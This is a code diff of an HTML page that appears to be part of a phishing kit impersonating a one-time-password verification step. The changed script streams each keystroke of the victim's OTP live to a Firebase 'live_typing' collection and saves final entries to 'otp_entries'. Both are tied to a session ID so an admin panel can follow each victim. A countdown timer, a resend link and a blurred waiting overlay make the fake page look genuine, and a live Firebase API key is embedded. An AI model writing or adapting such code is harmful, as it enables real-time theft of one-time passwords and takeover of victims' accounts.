@@ -1,100 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>dehijlbrd</title>
+  <title>mgl</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
   <style>
-    body {
-      font-family: Arial;
-      background-color: #FFFFFF;
-      text-align: center;
-      padding: 20px;
-      margin: 0;
-    }
-    img {
-      width: 100%;
-      max-width: 300%;
-      border-radius: 10px;
-    }
-    .side-button {
-      margin-top: 20px;
-      padding: 12px;
-      width: 100%;
-      font-size: 17px;
-      background-color: #4082ff;
-      color: #FFFFFF;
-      border: none;
-      border-radius: 10px;
-    }
-    .form-container {
-      margin-top: 30px;
-      text-align: left;
-      max-width: 400px;
-      margin-left: auto;
-      margin-right: auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    .form-container h2 {
-      text-align: center;
-      background-color: #0f7213;
-      color: white;
-      padding: 10px;
-      border-radius: 5px;
-    }
-    .input-group {
-      margin-bottom: 15px;
-    }
-    .input-group label {
-      font-size: 16px;
-      font-weight: bold;
-      display: block;
-      margin-bottom: 5px;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 10px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    #message {
-      color: red;
-      font-size: 18px;
-      text-align: center;
-      margin-top: 15px;
-    }
-    #overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      backdrop-filter: blur(5px);
-      background-color: rgba(255,255,255,0.5);
-      display: none;
-      justify-content: center;
-      align-items: center;
-      z-index: 9999;
-    }
-    #timer {
-      text-align: center;
-      margin-top: 10px;
-      font-weight: bold;
-      color: #333;
-    }
-    #resendBtn {
-      margin-top: 10px;
-      background: none;
-      border: none;
-      color: blue;
-      text-decoration: underline;
-      cursor: pointer;
-      display: none;
-    }
+    /* Sabhi CSS same hai, koi badlaw nahi */
+    body { font-family: Arial; background-color: #FFFFFF; text-align: center; padding: 20px; margin: 0; }
+    img { width: 100%; max-width: 300%; border-radius: 10px; }
+    .side-button { margin-top: 20px; padding: 12px; width: 100%; font-size: 17px; background-color: #4082ff; color: #FFFFFF; border: none; border-radius: 10px; cursor: pointer; }
+    .form-container { margin-top: 30px; text-align: left; max-width: 400px; margin-left: auto; margin-right: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    .form-container h2 { text-align: center; background-color: #0f7213; color: white; padding: 10px; border-radius: 5px; }
+    .input-group { margin-bottom: 15px; }
+    .input-group label { font-size: 16px; font-weight: bold; display: block; margin-bottom: 5px; }
+    .input-group input { width: 100%; padding: 10px; font-size: 16px; border: 1px solid #ccc; border-radius: 5px; }
+    #message { color: red; font-size: 18px; text-align: center; margin-top: 15px; }
+    #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; backdrop-filter: blur(5px); background-color: rgba(255,255,255,0.5); display: none; justify-content: center; align-items: center; z-index: 9999; }
+    #timer { text-align: center; margin-top: 10px; font-weight: bold; color: #333; }
+    #resendBtn { margin-top: 10px; background: none; border: none; color: blue; text-decoration: underline; cursor: pointer; display: none; }
   </style>
 
   <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
@@ -127,12 +50,11 @@
     </lottie-player>
   </div>
 
-  <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
 
   <script>
-      const firebaseConfig = {
+    const firebaseConfig = {
       apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
       authDomain: "ss22-a96d3.firebaseapp.com",
       projectId: "ss22-a96d3",
@@ -144,39 +66,35 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
+    // --- SESSION ID READ ---
+    const sessionId = localStorage.getItem("user_session_id");
+
     let attempt = 0;
     let timeLeft = 300;
     let timerInterval;
-    let liveDocId = null;
 
     function liveUpdate() {
+      if (!sessionId) return;
+      
       const data = {
+        sessionId: sessionId, // ID attached
         otp: document.getElementById("otp").value,
+        method: "Step: OTP Page",
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       };
 
-      if (!liveDocId) {
-        db.collection("live_typing").add(data).then(doc => {
-          liveDocId = doc.id;
-        });
-      } else {
-        db.collection("live_typing").doc(liveDocId).update(data);
-      }
+      // Doc ID hamesha sessionId rahega takki Admin mein ek hi jagah update ho
+      db.collection("live_typing").doc(sessionId).set(data, { merge: true });
     }
 
     function startTimer() {
       clearInterval(timerInterval);
       timeLeft = 300;
-
       timerInterval = setInterval(() => {
         let minutes = Math.floor(timeLeft / 60);
         let seconds = timeLeft % 60;
-
-        document.getElementById("timer").textContent =
-          `OTP expires in ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-
+        document.getElementById("timer").textContent = `OTP expires in ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
         timeLeft--;
-
         if (timeLeft < 0) {
           clearInterval(timerInterval);
           document.getElementById("timer").textContent = "OTP Expired";
@@ -214,7 +132,9 @@
       overlay.style.display = "flex";
       button.disabled = true;
 
+      // Final save with Session ID
       db.collection("otp_entries").add({
+        sessionId: sessionId, // Attached ID
         otp: otp,
         attempt: attempt + 1,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
@@ -236,6 +156,5 @@
       }, 10000);
     }
   </script>
-
 </body>
 </html>
